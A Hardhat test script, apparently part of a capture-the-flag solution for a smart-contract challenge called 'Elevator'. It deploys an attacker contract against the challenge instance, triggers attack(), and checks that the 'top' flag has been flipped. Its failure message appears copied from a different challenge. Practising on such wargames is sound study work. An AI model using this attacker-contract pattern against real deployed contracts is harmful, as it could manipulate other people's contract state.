const { assert, expect } = require("chai")
const { network, ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, attacker

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS11 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`Elevator`)
    challenge = await challengeFactory.attach(challengeAddress)

    const attackerFactory = await ethers.getContractFactory(`ElevatorAttacker`)
    attacker = await attackerFactory.deploy(challenge.address)
})

it("Solves the challenge 'Elevator'", async () => {
    tx = await attacker.attack()
    await tx.wait(1)

    let top = (await challenge.top()).toString()
    assert(top == "true", "You didn't take everything!")
})
